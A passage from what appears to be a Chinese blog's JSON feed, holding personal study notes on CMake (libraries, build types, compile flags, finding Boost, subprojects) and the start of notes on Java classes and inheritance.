keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#链接库和包含头文件都有关于 scope 这三个关键字的用法。</span></pre></td></tr></table></figure><h4 id=\"创建静态库\"><a class=\"markdownIt-Anchor\" href=\"#创建静态库\">#</a> 创建静态库</h4>\n<p>add_library（）函数用于从某些源文件创建一个库，默认生成在构建文件夹。 写法如下：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 add_library 调用中包含了源文件，用于创建名称为 libhello_library.a 的静态库。</p>\n<h3 id=\"链接库\"><a class=\"markdownIt-Anchor\" href=\"#链接库\">#</a> 链接库</h3>\n<p>创建将使用这个库的可执行文件时，必须告知编译器需要用到这个库。 可以使用 target_link_library（）函数完成此操作。add_executable () 连接源文件，target_link_libraries () 连接库文件。</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这告诉 CMake 在链接期间将 hello_library 链接到 hello_binary 可执行文件。 同时，这个被链接的库如果有 INTERFACE 或者 PUBLIC 属性的包含目录，那么，这个包含目录也会被传递（ propagate ）给这个可执行文件。</p>\n<h2 id=\"四shared-library\"><a class=\"markdownIt-Anchor\" href=\"#四shared-library\">#</a> （四）Shared Library</h2>\n<h3 id=\"cmakeliststxt-4\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-4\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#根据 Hello.cpp 生成动态库</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#给动态库 hello_library 起一个别的名字 hello::library</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span><span class=\"token inserted class-name\">hello::library</span> ALIAS hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#为这个库目标，添加头文件路径，PUBLIC 表示包含了这个库的目标也会包含这个路径</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#根据 main.cpp 生成可执行文件</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#链接库和可执行文件，使用的是这个库的别名。PRIVATE 表示</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token inserted class-name\">hello::library</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"创建动态库\"><a class=\"markdownIt-Anchor\" href=\"#创建动态库\">#</a> 创建动态库</h3>\n<p>add_library（）函数用于从某些源文件创建一个动态库，默认生成在构建文件夹。 写法如下：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 add_library 调用中包含了源文件，用于创建名称为 libhello_library.so 的动态库。</p>\n<h2 id=\"五build-type\"><a class=\"markdownIt-Anchor\" href=\"#五build-type\">#</a> （五）build-type</h2>\n<h3 id=\"cmakeliststxt-5\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-5\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#如果没有指定则设置默认编译方式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> <span class=\"token operator\">AND</span> <span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_CONFIGURATION_TYPES</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">#在命令行中输出 message 里的信息</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">message</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Setting build type to 'RelWithDebInfo' as none was specified.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">#不管 CACHE 里有没有设置过 CMAKE_BUILD_TYPE 这个变量，都强制赋值这个值为 RelWithDebInfo</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_BUILD_TYPE</span> RelWithDebInfo <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Choose the type of build.\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\"># 当使用 cmake-gui 的时候，设置构建级别的四个可选项</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">set_property</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CACHE</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> PROPERTY <span class=\"token property\">STRINGS</span> <span class=\"token string\">\"Debug\"</span> <span class=\"token string\">\"Release\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"MinSizeRel\"</span> <span class=\"token string\">\"RelWithDebInfo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>build_type<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_build_type main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#这里的注释只说明注释后每一句的作用</span></pre></td></tr></table></figure><h3 id=\"构建级别\"><a class=\"markdownIt-Anchor\" href=\"#构建级别\">#</a> 构建级别</h3>\n<p>CMake 具有许多内置的构建配置，可用于编译工程。 这些配置指定了代码优化的级别，以及调试信息是否包含在二进制文件中。</p>\n<p>这些优化级别，主要有：</p>\n<ul>\n<li>\n<p>Release —— 不可以打断点调试，程序开发完成后发行使用的版本，占的体积小。 它对代码做了优化，因此速度会非常快，</p>\n<p>在编译器中使用命令：  <code>-O3 -DNDEBUG</code>  可选择此版本。</p>\n</li>\n<li>\n<p>Debug —— 调试的版本，体积大。</p>\n<p>在编译器中使用命令：  <code>-g</code>  可选择此版本。</p>\n</li>\n<li>\n<p>MinSizeRel—— 最小体积版本</p>\n<p>在编译器中使用命令： <code>-Os -DNDEBUG</code>  可选择此版本。</p>\n</li>\n<li>\n<p>RelWithDebInfo—— 既优化又能调试。</p>\n<p>在编译器中使用命令： <code>-O2 -g -DNDEBUG</code>  可选择此版本。</p>\n</li>\n</ul>\n<h3 id=\"设置级别的方式\"><a class=\"markdownIt-Anchor\" href=\"#设置级别的方式\">#</a> 设置级别的方式</h3>\n<h4 id=\"cmake图形界面\"><a class=\"markdownIt-Anchor\" href=\"#cmake图形界面\">#</a> CMake 图形界面</h4>\n<p>cmake-gui</p>\n<h4 id=\"cmake命令行中\"><a class=\"markdownIt-Anchor\" href=\"#cmake命令行中\">#</a> CMake 命令行中</h4>\n<p>在命令行运行 CMake 的时候， 使用 cmake 命令行的 - D 选项配置编译类型</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake .. -DCMAKE_BUILD_TYPE=Release</pre></td></tr></table></figure><h2 id=\"六-compile-flags\"><a class=\"markdownIt-Anchor\" href=\"#六-compile-flags\">#</a> （六） Compile Flags</h2>\n<h3 id=\"cmakeliststxt-6\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-6\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#强制设置默认 C++ 编译标志变量为缓存变量，如 CMake（五） build type 所说，该缓存变量被定义在文件中，相当于全局变量，源文件中也可以使用这个变量</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Set C++ Compiler Flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>compile_flags<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#为可执行文件添加私有编译定义</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">target_compile_definitions</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> EX3</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"编译标志\"><a class=\"markdownIt-Anchor\" href=\"#编译标志\">#</a> 编译标志</h3>\n<p>编译标志是编译器在编译过程中使用的一些参数，用于指定编译器的行为。不同的编译标志会影响编译器的行为，从而影响生成的可执行文件的行为。例如，使用不同的编译标志可以控制编译器的优化级别、警告级别、调试信息等。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI3ODI1NDUxL2FydGljbGUvZGV0YWlscy8xMDMzOTI3MTk=\">1</span></p>\n<p>在 CMake 中，可以使用以下方法设置编译标志：</p>\n<ul>\n<li>通过 target_compile_definitions () 函数设置某个目标的编译标志，这是现代 CMake 中设置 C++ 标志的推荐方法。</li>\n<li>设置默认编译标志，可以使用以下方法：</li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c++ compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>设置全局 C 编译器标志，可以使用以下方法：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDkyMTI2NTA=\">参考</span></li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_C_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_C_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>不同的编译标志会影响编译器的行为，从而影响生成的可执行文件的行为。例如，使用不同的编译标志可以控制编译器的优化级别、警告级别、调试信息等。</p>\n<h2 id=\"七-including-third-party\"><a class=\"markdownIt-Anchor\" href=\"#七-including-third-party\">#</a> （七） Including Third Party</h2>\n<h3 id=\"cmakeliststxt-7\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-7\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Set the project name</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>third_party_include<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># find a boost install with the libraries filesystem and system</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#使用库文件系统和系统查找 boost install</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#这是第三方库，而不是自己生成的静态动态库</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># check if boost was found</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>Boost_FOUND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"boost found\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span>FATAL_ERROR <span class=\"token string\">\"Cannot find Boost\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Add an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>third_party_include main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># link against the boost libraries</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> third_party_include</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"cmake解析\"><a class=\"markdownIt-Anchor\" href=\"#cmake解析\">#</a> CMake 解析</h3>\n<p>几乎所有不平凡的项目都将要求包含第三方库，头文件或程序。 CMake 支持使用 find_package（）函数查找这些工具的路径。  这将从 CMAKE_MODULE_PATH 中的文件夹列表中搜索格式为 “FindXXX.cmake” 的 CMake 模块。  在 linux 上，默认搜索路径将是 /usr/share /cmake/ Modules。  在我的系统上，这包括对大约 142 个通用第三方库的支持。</p>\n<p>此示例要求将 Boost 库安装在默认系统位置。</p>\n<h3 id=\"finding-a-package\"><a class=\"markdownIt-Anchor\" href=\"#finding-a-package\">#</a> Finding a Package</h3>\n<p>如上所述，find_package（）函数将从 CMAKE_MODULE_PATH 中的文件夹列表中搜索 “FindXXX.cmake” 中的 CMake 模块。 find_package 参数的确切格式取决于要查找的模块。  这通常记录在 FindXXX.cmake 文件的顶部。</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参数：</p>\n<p>Boost - 库名称。 这是用于查找模块文件 FindBoost.cmake 的一部分</p>\n<p>1.46.1 - 需要的 boost 库最低版本</p>\n<p>REQUIRED - 告诉模块这是必需的，如果找不到会报错</p>\n<p>COMPONENTS - 要查找的库列表。从后面的参数代表的库里找 boost</p>\n<p>可以使用更多参数，也可以使用其他变量。 在后面的示例中提供了更复杂的设置。</p>\n<h2 id=\"18-用clang编译工程我略了\"><a class=\"markdownIt-Anchor\" href=\"#18-用clang编译工程我略了\">#</a> 1.8 用 clang 编译工程 (我略了)</h2>\n<p>使用 CMake 进行构建时，可以设置 C 和 C ++ 编译器。 此示例与<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZnVtZWNqZi5naXRodWIuaW8vY21ha2UtZXhhbXBsZXMtQ2hpbmVzZS9BLWhlbGxvLWNtYWtl\"> hello-cmake</span> 示例相同，不同之处在于它显示了将编译器从默认的 gcc 更改为<span class=\"exturl\" data-url=\"aHR0cDovL2NsYW5nLmxsdm0ub3JnLw==\"> clang</span> 的最基本方法。</p>\n<h2 id=\"19-用ninja构建工程略啦\"><a class=\"markdownIt-Anchor\" href=\"#19-用ninja构建工程略啦\">#</a> 1.9 用 ninja 构建工程 (略啦)</h2>\n<p>CMake 是一个元构建系统，可用于为许多其他构建工具创建构建文件。 这个例子展示了如何让 CMake 使用 ninja 构建工具。</p>\n<h2 id=\"110-导入第三方库到目标\"><a class=\"markdownIt-Anchor\" href=\"#110-导入第三方库到目标\">#</a> 1.10 导入第三方库到目标</h2>\n<h3 id=\"导入目标\"><a class=\"markdownIt-Anchor\" href=\"#导入目标\">#</a> 导入目标</h3>\n<p>Imported targets 是 FindXXX 模块导出的只读目标。</p>\n<p>在 CMake 命令中包含 boost 这个库：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> imported_targets</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>          <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>\n<p>作用是自动链接 Boost</p>\n<p>filesystem 和 Boost :: system 库，同时还包括 Boost 头文件目录。</p>\n</li>\n</ul>\n<h2 id=\"111-设置c-标准\"><a class=\"markdownIt-Anchor\" href=\"#111-设置c-标准\">#</a> 1.11 设置 C++ 标准</h2>\n<p>CMake 支持传递一个变量给函数 CMAKE_CXX_COMPILER_FLAG 来编译程序。 然后将结果存储在您传递的变量中。</p>\n<p>For example:</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span>CheckCXXCompilerFlag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">CHECK_CXX_COMPILER_FLAG</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-std=c++11\"</span> COMPILER_SUPPORTS_CXX11<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"21子项目\"><a class=\"markdownIt-Anchor\" href=\"#21子项目\">#</a> 2.1 子项目</h2>\n<p>本示例说明如何包含子项目。 顶级 CMakeLists.txt 调用子目录中的 CMakeLists.txt 来创建以下内容：</p>\n<ul>\n<li>sublibrary1 - 一个静态库</li>\n<li>sublibrary2 - 只有头文件的库</li>\n<li>subbinary - 一个可执行文件</li>\n</ul>\n<p>文件树如下:</p>\n<pre><code>$ tree\n.\n├── CMakeLists.txt\n├── subbinary\n│   ├── CMakeLists.txt\n│   └── main.cpp\n├── sublibrary1\n│   ├── CMakeLists.txt\n│   ├── include\n│   │   └── sublib1\n│   │       └── sublib1.h\n│   └── src\n│       └── sublib1.cpp\n└── sublibrary2\n    ├── CMakeLists.txt\n    └── include\n        └── sublib2\n            └── sublib2.h\n</code></pre>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "title": "JAVA学习",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\">#</a> JAVA</h1>\n<p>[^Java 是一种面向对象的编程语言，它支持类和对象的概念。类是一种用户定义的数据类型，它包含了数据域和方法。对象是类的一个实例，它可以操作类中定义的方法和数据。]:</p>\n<p>个人在学习 JAVA 过程中的一些总结</p>\n<h2 id=\"一些java与c的区别\"><a class=\"markdownIt-Anchor\" href=\"#一些java与c的区别\">#</a> 一些 JAVA 与 C 的区别</h2>\n<p>Java 和 C 语言有以下几个区别：</p>\n<ol>\n<li>Java 是一种面向对象的编程语言，而 C 语言是一种过程式编程语言。</li>\n<li>Java 有垃圾回收机制，而 C 语言需要手动管理内存。</li>\n<li>Java 可以跨平台运行，而 C 语言通常需要编译成特定的机器码才能运行。</li>\n<li>Java 支持继承、封装和多态等面向对象编程的概念，而 C 语言不支持这些概念。</li>\n<li>Java 有自己的虚拟机（JVM）来解释和执行字节码，而 C 语言直接编译成机器码运行。</li>\n</ol>\n<h2 id=\"类的定义\"><a class=\"markdownIt-Anchor\" href=\"#类的定义\">#</a> 类的定义</h2>\n<p>在 Java 中，通过关键字  <code>class</code>  来定义一个类。类的定义一般包含以下几部分：</p>\n<pre><code>public class ClassName &#123;\n    // 定义数据域\n    // ...\n\n    // 定义方法\n    // ...\n&#125;\n</code></pre>\n<p>其中  <code>public</code>  是访问修饰符，用于指定类的访问权限。类名  <code>ClassName</code>  可以自定义，但是必须符合 Java 的命名规范。</p>\n<h2 id=\"对象的创建\"><a class=\"markdownIt-Anchor\" href=\"#对象的创建\">#</a> 对象的创建</h2>\n<p>使用  <code>new</code>  关键字可以创建一个对象。例如：</p>\n<pre><code>ClassName object = new ClassName();\n</code></pre>\n<p>这里  <code>ClassName</code>  是类名， <code>object</code>  是对象名， <code>new</code>  关键字用于创建对象。通过  <code>.</code>  运算符可以访问对象的属性和方法，例如：</p>\n<pre><code>object.propertyName;\nobject.methodName();\n</code></pre>\n<h2 id=\"对象的构造和析构\"><a class=\"markdownIt-Anchor\" href=\"#对象的构造和析构\">#</a> 对象的构造和析构</h2>\n<p>在 Java 中，对象的构造方法和析构方法分别是  <code>constructor</code>  和  <code>finalize</code> 。构造方法在对象创建时被调用，用于初始化对象的状态；析构方法在对象销毁时被调用，用于清理对象的状态。</p>\n<pre><code>public ClassName() &#123;\n    // 构造方法代码\n&#125;\n\nprotected void finalize() &#123;\n    // 析构方法代码\n&#125;\n</code></pre>\n<h2 id=\"封装\"><a class=\"markdownIt-Anchor\" href=\"#封装\">#</a> 封装</h2>\n<p>在 Java 中，封装是一种面向对象的编程概念。它指的是将数据和方法封装在一个类中，并通过访问修饰符来控制对这些数据和方法的访问权限。Java 中的访问修饰符包括  <code>public</code> 、 <code>private</code> 、 <code>protected</code>  和默认访问修饰符。其中， <code>public</code>  表示公共访问权限， <code>private</code>  表示私有访问权限， <code>protected</code>  表示受保护的访问权限，而默认访问修饰符则表示包级访问权限。</p>\n<h2 id=\"继承\"><a class=\"markdownIt-Anchor\" href=\"#继承\">#</a> 继承</h2>\n<p>继承是 Java 中另一个重要的面向对象编程概念。它指的是子类继承父类的属性和方法，并且可以在子类中添加新的属性和方法。Java 中的继承关系可以用  <code>extends</code>  关键字表示，例如：</p>\n<pre><code>class SubClassName extends SuperClassName &#123;\n    // 子类的属性和方法\n&#125;\n</code></pre>\n<h2 id=\"多态\"><a class=\"markdownIt-Anchor\" href=\"#多态\">#</a> 多态</h2>\n<p>多态是 Java 